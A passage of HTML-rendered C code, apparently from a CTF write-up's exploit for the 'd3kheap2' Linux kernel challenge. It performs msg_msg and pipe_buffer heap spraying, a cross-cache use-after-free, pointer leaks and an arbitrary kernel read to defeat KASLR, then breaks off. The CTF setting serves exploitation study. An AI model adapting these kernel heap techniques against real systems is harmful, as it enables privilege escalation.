class="string">&quot;/proc/d3kheap2&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (d3kheap2_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;[x] Unable to open chal fd&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open /dev/d3kheap2!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing msg_queue...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((reclaim_msgq[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to allocate no.%d reclaim msg_queue&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate msg_queue for clearing partial SLUB!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((vuln_msgq[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to allocate no.%d vuln msg_queue&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate msg_queue to be UAF!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((evil_msgq[i] = get_msg_queue()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to allocate no.%d evil msg_queue&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate msg_queue to be evil!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (atk_msgq = get_msg_queue() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to allocate attacker msg_queue&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to allocate msg_queue for attacking!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write_msg(</span><br><span class="line">                reclaim_msgq[i],</span><br><span class="line">                buf,</span><br><span class="line">                <span class="number">0x1000</span> - <span class="number">0x30</span>,</span><br><span class="line">                MSG_TAG_BASE + j</span><br><span class="line">            ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to prealloc %d-%d 4k msg_msg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to spray msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Preparing pipe_buffer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to create %d pipe\n&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to prepare pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Spraying d3kheap2 buffer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((errno = d3kheap2_alloc(d3kheap2_fd, i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;FAILED to allocate no.&quot;</span>)<span class="string">&quot;%d&quot;</span></span><br><span class="line">                ERROR_MSG(<span class="string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                errno</span><br><span class="line">            );</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate d3kheap2 buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(</span><br><span class="line">        <span class="string">&quot;[*] Freeing d3kheap2 buffer into buddy &quot;</span></span><br><span class="line">        <span class="string">&quot;and reclaiming as kmalloc-cg-2k SLUB page...&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pipe_spray_nr = msg_spray_nr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i / KMALLOC_2K_OBJ_PER_SLUB) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;FAILED to free no.&quot;</span>)<span class="string">&quot;%d&quot;</span></span><br><span class="line">                ERROR_MSG(<span class="string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                errno</span><br><span class="line">            );</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Spraying msg_msg to reclaim...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (MSG_SPRAY_NR / <span class="number">2</span>); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read_msg(reclaim_msgq[i],buf,<span class="number">0x1000</span><span class="number">-0x30</span>,MSG_TAG_BASE+j) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to reclaim %d-%d 4k msg_msg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to reclaim msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            buf[<span class="number">520</span>] = i;</span><br><span class="line">            buf[<span class="number">521</span>] = j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write_msg(vuln_msgq[i],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+j) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to spray msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i / KMALLOC_2K_OBJ_PER_SLUB) % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;FAILED to free no.&quot;</span>)<span class="string">&quot;%d&quot;</span></span><br><span class="line">                ERROR_MSG(<span class="string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                errno</span><br><span class="line">            );</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Spraying msg_msg to reclaim...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = MSG_SPRAY_NR / <span class="number">2</span>; j &lt; MSG_SPRAY_NR; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read_msg(reclaim_msgq[i],buf,<span class="number">0x1000</span><span class="number">-0x30</span>,MSG_TAG_BASE+j) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to reclaim %d-%d 4k msg_msg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to reclaim msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            buf[<span class="number">520</span>] = i;</span><br><span class="line">            buf[<span class="number">521</span>] = j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write_msg(vuln_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE+j) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to spray msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* To be honest, we only need to free ONE obj here, just think :) */</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Creating UAF on msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((errno = d3kheap2_free(d3kheap2_fd, i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERROR_MSG(<span class="string">&quot;FAILED to free no.&quot;</span>)<span class="string">&quot;%d&quot;</span></span><br><span class="line">                ERROR_MSG(<span class="string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                errno</span><br><span class="line">            );</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to free d3kheap2 buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;</span><br><span class="line">            buf[<span class="number">520</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">            buf[<span class="number">520</span>] += i;</span><br><span class="line">            buf[<span class="number">521</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;D3CTFPWN&quot;</span>;</span><br><span class="line">            buf[<span class="number">521</span>] += j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write_msg(evil_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE + j)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n&quot;</span>,</span><br><span class="line">                    i,</span><br><span class="line">                    j);</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to spray msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make sure the UAF object is on CPU SLAB, so no more spray then */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; MSG_QUEUE_NR; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; MSG_SPRAY_NR; l++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (peek_msg(vuln_msgq[k], buf, MSG_PEEK_SZ, l) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">snprintf</span>(</span><br><span class="line">                    err_msg,</span><br><span class="line">                    <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;[x] Unable to peek %d-%d msg_msg\n&quot;</span>,</span><br><span class="line">                    k,</span><br><span class="line">                    l</span><br><span class="line">                );</span><br><span class="line">                perror(err_msg);</span><br><span class="line">                err_exit(<span class="string">&quot;FAILED to peek msg_msg!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (buf[<span class="number">520</span>] == *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span></span><br><span class="line">                || buf[<span class="number">521</span>] == *(<span class="type">size_t</span>*) <span class="string">&quot;D3CTFPWN&quot;</span>) &#123;</span><br><span class="line">                evilq_idx = buf[<span class="number">520</span>] - *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">                evilm_idx = buf[<span class="number">521</span>] - *(<span class="type">size_t</span>*) <span class="string">&quot;D3CTFPWN&quot;</span>;</span><br><span class="line">                vulq_idx = k;</span><br><span class="line">                vulm_idx = l;</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;[+] Found victim on no.&quot;</span>)<span class="string">&quot;%d &quot;</span></span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;msg in no.&quot;</span>)<span class="string">&quot;%d&quot;</span>SUCCESS_MSG(<span class="string">&quot;vulqueue&quot;</span>)</span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;.Same msg is on no.&quot;</span>)<span class="string">&quot;%d &quot;</span></span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;msg in no.&quot;</span>)<span class="string">&quot;%d \n&quot;</span>,</span><br><span class="line">                    vulm_idx,</span><br><span class="line">                    vulq_idx,</span><br><span class="line">                    evilm_idx,</span><br><span class="line">                    evilq_idx</span><br><span class="line">                );</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">goto</span> out_uaf_msg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create cross-cache UAF by spraying msg_msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_uaf_msg:</span><br><span class="line">    log_info(<span class="string">&quot;[*] Shifting obj-overlapping from msg_msg to pipe_buffer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(vuln_msgq[vulq_idx],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+vulm_idx)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to free the victim msg_msg&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to free victim msg_msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NR / <span class="number">2</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">32</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to reclaim msg_msg with pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(</span><br><span class="line">        evil_msgq[evilq_idx],</span><br><span class="line">        buf,</span><br><span class="line">        MSG_SPRAY_SZ,</span><br><span class="line">        MSG_TAG_BASE + evilm_idx</span><br><span class="line">    ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to free the victim msg_msg&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to free victim msg_msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* identification */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NR / <span class="number">2</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* The greate j8 helps us a lot :) */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = (PIPE_SPRAY_NR / <span class="number">2</span>); i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">32</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(</span><br><span class="line">                err_msg,</span><br><span class="line">                <span class="keyword">sizeof</span>(err_msg) - <span class="number">1</span>,</span><br><span class="line">                <span class="string">&quot;[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe&quot;</span>,</span><br><span class="line">                i</span><br><span class="line">            );</span><br><span class="line">            perror(err_msg);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to reclaim msg_msg with pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">114</span>; j++) &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * we keep checking to make sure that the object is allocated</span></span><br><span class="line"><span class="comment">         * from the first object of CPU SLUB, hence no spray later</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (PIPE_SPRAY_NR / <span class="number">2</span>); j++) &#123;</span><br><span class="line">            <span class="type">int</span> ident;</span><br><span class="line">            read(pipe_fd[j][<span class="number">0</span>], &amp;ident, <span class="keyword">sizeof</span>(ident));</span><br><span class="line">            <span class="keyword">if</span> (ident != j) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;[+] Found victim pipe: &quot;</span>)<span class="string">&quot;%d&quot;</span></span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot; , overlapped with &quot;</span>)<span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                    j,</span><br><span class="line">                    ident</span><br><span class="line">                );</span><br><span class="line">                victim_pipe = j;</span><br><span class="line">                ovlp_pipe = ident;</span><br><span class="line">                <span class="keyword">goto</span> out_overlap_pipe;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[j][<span class="number">1</span>], &amp;ident, <span class="keyword">sizeof</span>(ident));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to shift OVERLAP from msg_msg to pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_overlap_pipe:</span><br><span class="line">    close(pipe_fd[victim_pipe][<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[victim_pipe][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(atk_pipe) &lt; <span class="number">0</span> || fcntl(atk_pipe[<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>*<span class="number">32</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to allocate new pipe for attacking!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* move to pipe_buffer[1] */</span></span><br><span class="line">    write(atk_pipe[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    read(atk_pipe[<span class="number">0</span>], buf, <span class="number">8</span>);</span><br><span class="line">    write(atk_pipe[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[ovlp_pipe][<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[ovlp_pipe][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span> (write_msg(atk_msgq, buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to allocate new msg_msg&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to reclaim the victim pipe_buffer as msg_msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(atk_pipe[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to peek the victim object&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to peek the victim object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_pipe_buf = (<span class="type">void</span>*) &amp;msg_buf[<span class="number">516</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;[+] Leak pipe_buffer::page &quot;</span>) <span class="string">&quot;%p&quot;</span></span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;, pipe_buffer::ops &quot;</span>) <span class="string">&quot;%p\n&quot;</span>,</span><br><span class="line">        leak_pipe_buf-&gt;page,</span><br><span class="line">        leak_pipe_buf-&gt;ops</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pipe_flags = leak_pipe_buf-&gt;flags;</span><br><span class="line">    pipe_ops = (<span class="type">void</span>*) leak_pipe_buf-&gt;ops;</span><br><span class="line">    pipe_private = leak_pipe_buf-&gt;private;</span><br><span class="line"></span><br><span class="line">    vmemmap_base = (<span class="type">size_t</span>) leak_pipe_buf-&gt;page &amp; KASLR_MASK;</span><br><span class="line">    log_info(<span class="string">&quot;[*] Try to guess vmemmap_base...&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Starts from %lx...\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[x] Unable to allocate new msg_msg&quot;</span>);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to reclaim the victim pipe_buffer as msg_msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe(</span><br><span class="line">        vmemmap_base + <span class="number">0x9d000</span> / <span class="number">0x1000</span> * <span class="number">0x40</span>,</span><br><span class="line">        buf,</span><br><span class="line">        <span class="number">0xff0</span>,</span><br><span class="line">        atk_msgq,</span><br><span class="line">        msg_buf,</span><br><span class="line">        MSG_SPRAY_SZ,</span><br><span class="line">        MSG_TAG_BASE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    kernel_leak = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> loop_nr = <span class="number">0</span>; <span class="number">1</span>; loop_nr++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (kernel_leak &gt; <span class="number">0xffffffff81000000</span></span><br><span class="line">            &amp;&amp; (kernel_leak &amp; <span class="number">0xff</span>) &lt; <span class="number">0x100</span>) &#123;</span><br><span class="line">            kernel_base = kernel_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">            <span class="keyword">if</span> (loop_nr != <span class="number">0</span>) 